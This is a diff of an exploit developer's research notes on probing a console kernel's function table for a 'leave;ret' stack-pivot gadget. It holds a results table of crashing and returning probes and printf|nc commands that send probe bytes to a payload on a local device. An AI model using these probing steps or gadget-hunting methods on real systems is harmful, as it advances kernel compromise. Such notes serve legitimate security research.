@@ -1215,61 +1215,46 @@ probe_type=2 (fn-2), end_marker=0xdeadbeefcafe010a
 
 **Conclusion**: Neither entry [2] nor [14] has leave;ret (C9 C3) at fn-2. Both fn-2 bytes are benign prefixes that fall through to the C3 at fn-1 and return cleanly. Need to scan more entries for fn-1=C3 candidates.
 
-### Next: Systematic fn-1 Scan (0xEE mode)
+### fn-1 Scan Results (0xEE mode)
 
-Only 4 of 28 entries probed for fn-1. 20+ entries remain untested. Use v10a 0xEE mode to find more fn-1=C3 candidates, then probe their fn-2 for C9.
+| Entry | Name | Offset | fn-1 | fn-2 | Notes |
+|-------|------|--------|------|------|-------|
+| [0] | create | +0x28DB88 | **PANIC** | — | Bad byte, crashed kproc |
+| [1] | init | +0x28D310 | **PANIC** | — | Bad byte, crashed kproc |
+| [2] | xapic_mode | +0x294340 | **C3** | benign (48) | REX.W ret epilogue |
+| [3] | is_x2apic | +0x290808 | other | — | RAX=0xf64c4566fcc97ae4 |
+| [5] | dump | +0x294100 | other | — | RAX=0xff |
+| [14] | set_lvt_mode | +0x28E700 | **C3** | benign (48) | REX.W ret epilogue |
+| [17] | lvt_eoi_clear | +0x2941D0 | **C3** | benign (48) | REX.W ret epilogue |
+| [18] | set_tpr | +0x294348 | **C3** | benign (48) | REX.W ret epilogue |
+| [19] | get_timer_freq | +0x294320 | **CC** | — | INT3 padding |
+| [24] | timer_current_count | +0x290800 | **PANIC** | — | Bad byte |
 
-**fn-1 summary so far:**
-```
-[2]  fn-1=C3   [14] fn-1=C3   [19] fn-1=CC   [24] fn-1=PANIC
-```
+**Key finding**: All fn-1=C3 entries have fn-2=`48` (REX.W prefix). Sony Clang consistently emits `48 C3` (REX.W ret) epilogues, not `C9 C3` (leave;ret). The `48` is likely the last byte of a preceding multi-byte instruction that the CPU reinterprets as a REX prefix when we jump to fn-2.
 
-**Batch 1 — safest entries to probe fn-1:**
-```
-printf '\x03\xEE\x00\x00' | nc 192.168.0.88 9022   # [3]  is_x2apic
-printf '\x05\xEE\x00\x00' | nc 192.168.0.88 9022   # [5]  dump
-printf '\x11\xEE\x00\x00' | nc 192.168.0.88 9022   # [17] lvt_eoi_clear
-printf '\x12\xEE\x00\x00' | nc 192.168.0.88 9022   # [18] set_tpr
-```
+### Phase 11a: fn-3 Probe — leave;REX.W-ret Discovery (v10a2)
 
-**Batch 2 — likely safe:**
+**Insight**: Since fn-2=`48` and fn-1=`C3` for all C3 entries, the byte at fn-3 might be `C9` (leave). Calling fn-3 would execute:
 ```
-printf '\x00\xEE\x00\x00' | nc 192.168.0.88 9022   # [0]  create
-printf '\x01\xEE\x00\x00' | nc 192.168.0.88 9022   # [1]  init
-printf '\x04\xEE\x00\x00' | nc 192.168.0.88 9022   # [4]  setup
-printf '\x07\xEE\x00\x00' | nc 192.168.0.88 9022   # [7]  set_id
-printf '\x0A\xEE\x00\x00' | nc 192.168.0.88 9022   # [10] ipi_wait
+C9    = leave (RSP=RBP, pop RBP)
+48 C3 = REX.W ret (= ret)
 ```
+This is `leave;ret` with a useless REX prefix — a working stack pivot gadget!
 
-**Batch 3 — moderate risk:**
-```
-printf '\x0B\xEE\x00\x00' | nc 192.168.0.88 9022   # [11] ipi_alloc
-printf '\x0C\xEE\x00\x00' | nc 192.168.0.88 9022   # [12] ipi_free
-printf '\x0D\xEE\x00\x00' | nc 192.168.0.88 9022   # [13] set_lvt_mask
-printf '\x0F\xEE\x00\x00' | nc 192.168.0.88 9022   # [15] set_lvt_polarity
-printf '\x10\xEE\x00\x00' | nc 192.168.0.88 9022   # [16] set_lvt_triggermode
-```
+**Code change**: Added `0xCC` mode prefix for fn-3 probing (probe_offset=3).
 
-**Batch 4 — remaining:**
+**Deployment (v10a2, 976 bytes):**
 ```
-printf '\x14\xEE\x00\x00' | nc 192.168.0.88 9022   # [20] timer_enable_intr
-printf '\x15\xEE\x00\x00' | nc 192.168.0.88 9022   # [21] timer_disable_intr
-printf '\x16\xEE\x00\x00' | nc 192.168.0.88 9022   # [22] timer_set_divisor
-printf '\x19\xEE\x00\x00' | nc 192.168.0.88 9022   # [25] self_ipi
-printf '\x1A\xEE\x00\x00' | nc 192.168.0.88 9022   # [26] unnamed
-printf '\x1B\xEE\x00\x00' | nc 192.168.0.88 9022   # [27] unnamed
+printf '\x02\xCC\x00\x00' | nc 192.168.0.88 9022   # [2]  xapic_mode fn-3
+printf '\x0E\xCC\x00\x00' | nc 192.168.0.88 9022   # [14] set_lvt_mode fn-3
+printf '\x11\xCC\x00\x00' | nc 192.168.0.88 9022   # [17] lvt_eoi_clear fn-3
+printf '\x12\xCC\x00\x00' | nc 192.168.0.88 9022   # [18] set_tpr fn-3
 ```
 
-Skip [6] disable, [8] ipi_raw, [9] ipi_vectored, [23] timer_initial_count (dangerous side effects).
+**Expected outcomes:**
+- Sentinel unchanged → fn-3 is benign (90/66/F3 prefix)
+- Crash (step stuck at 0x100+idx) → fn-3 is NOT benign → could be C9 (leave;ret!) or other
+- RAX changed → fn-3 executed something that modified RAX
 
-**Interpretation:**
-- sentinel (0xBAD0BAD0BAD0BAD0) unchanged → **C3** (ret)
-- RAX changed to function return value → **CC** (INT3 → doreti_iret bounce → fn executes)
-- 0xFAFAFAFAFAFAFAFA → **faulted** (#PF caught by pcb_onfault)
-- PANIC (no readback) → **bad byte** (#UD/#GP)
-
-For any new fn-1=C3 entry, immediately probe fn-2 with 0xDD mode:
-```
-printf '\xNN\xDD\x00\x00' | nc 192.168.0.88 9022   # where NN = entry index
-```
+**Status**: Built (976 bytes, no .bss), awaiting deployment.
 
